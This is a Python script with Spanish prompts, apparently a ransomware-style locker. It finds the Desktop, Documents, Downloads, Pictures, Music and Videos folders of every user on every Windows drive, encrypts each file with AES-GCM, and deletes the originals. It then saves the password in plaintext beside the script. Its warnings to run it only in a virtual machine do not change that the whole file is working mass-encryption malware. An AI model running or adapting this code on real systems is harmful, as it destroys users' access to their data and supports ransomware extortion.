import os
import hashlib
import sys
import string
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

def derive_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=600000)
    return kdf.derive(password.encode('utf-8'))

def encriptar_archivo(ruta: str, password: str):
    try:
        salt = os.urandom(16)
        nonce = os.urandom(12)
        key = derive_key(password, salt)
        aesgcm = AESGCM(key)
        with open(ruta, 'rb') as f:
            data = f.read()
        ciphertext = aesgcm.encrypt(nonce, data, None)
        with open(ruta + ".locked", 'wb') as f:
            f.write(salt + nonce + ciphertext)
        os.remove(ruta)
        return True
    except Exception:
        return False

def main():
    print("=" * 60)
    print("  CIFRADO DE ARCHIVOS PERSONALES")
    print("=" * 60)
    print("\n[!] SOLO se cifrarán las carpetas personales de cada usuario:")
    print("    Escritorio, Documentos, Descargas, Imágenes, Música, Videos")
    print("[!] NO HABRÁ MARCHA ATRÁS SIN LA CONTRASEÑA.")
    print("[!] ASEGURATE DE ESTAR EN UNA MÁQUINA VIRTUAL.\n")
    
    discos = []
    for letra in string.ascii_uppercase:
        ruta = f"{letra}:\\"
        if os.path.exists(ruta):
            discos.append(ruta)
    
    if not discos:
        print("No se detectaron discos.")
        input("Presiona Enter para salir...")
        return
    
    carpetas_personales = {
        "desktop", "escritorio",
        "documents", "documentos",
        "downloads", "descargas",
        "pictures", "imágenes", "imagenes",
        "music", "música", "musica",
        "videos"
    }
    
    # Buscar carpetas personales en cada disco
    carpetas_objetivo = []
    usuarios_saltar = {"public", "all users", "default", "default user", "administrator"}
    
    for disco_path in discos:
        users_path = os.path.join(disco_path, "Users")
        if not os.path.exists(users_path):
            continue
        try:
            for usuario in os.listdir(users_path):
                if usuario.lower() in usuarios_saltar:
                    continue
                ruta_usuario = os.path.join(users_path, usuario)
                if not os.path.isdir(ruta_usuario):
                    continue
                for carpeta in os.listdir(ruta_usuario):
                    if carpeta.lower() in carpetas_personales:
                        ruta_carpeta = os.path.join(ruta_usuario, carpeta)
                        if os.path.isdir(ruta_carpeta):
                            carpetas_objetivo.append(ruta_carpeta)
        except PermissionError:
            continue
    
    if not carpetas_objetivo:
        print("\nNo se encontraron carpetas personales para cifrar.")
        input("Presiona Enter para salir...")
        return
    
    print(f"\nCarpetas personales encontradas ({len(carpetas_objetivo)}):")
    for c in carpetas_objetivo:
        print(f"  - {c}")
    
    print("\nADVERTENCIA: No hay marcha atrás sin la contraseña.")
    
    password = input("Ingresa la contraseña de cifrado: ").strip()
    if not password:
        print("La contraseña no puede estar vacía.")
        input("Presiona Enter para salir...")
        return
    
    confirm = input("Confirma la contraseña: ").strip()
    if password != confirm:
        print("Las contraseñas no coinciden.")
        input("Presiona Enter para salir...")
        return
    
    print(f"\nCifrando archivos personales... (esto puede tardar)\n")
    
    contador = 0
    errores = 0
    
    for carpeta in carpetas_objetivo:
        for root_path, dirs, files in os.walk(carpeta):
            for file in files:
                ruta_completa = os.path.join(root_path, file)
                if file.endswith(".locked"):
                    continue
                try:
                    if encriptar_archivo(ruta_completa, password):
                        contador += 1
                        print(f"  [+] {ruta_completa}")
                    else:
                        errores += 1
                        print(f"  [-] {ruta_completa}")
                except KeyboardInterrupt:
                    print(f"\n\nCancelado por el usuario. {contador} archivos cifrados, {errores} errores.")
                    input("Presiona Enter para salir...")
                    return
    
    print(f"\n{'=' * 60}")
    print(f"  PROCESO FINALIZADO")
    print(f"  Archivos cifrados: {contador}")
    print(f"  Errores: {errores}")
    print(f"  Contraseña: {password}")
    print(f"{'=' * 60}")
    print("\n[!] RECORDATORIO: Para descifrar usá desbloquear_disco.py con esta contraseña.")
    
    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "contrasena_disco.txt"), "w") as f:
        f.write(f"Carpetas personales cifradas el {__import__('datetime').datetime.now()}\n")
        f.write(f"Contraseña: {password}\n")
    
    input("\nPresiona Enter para finalizar...")

if __name__ == "__main__":
    main()
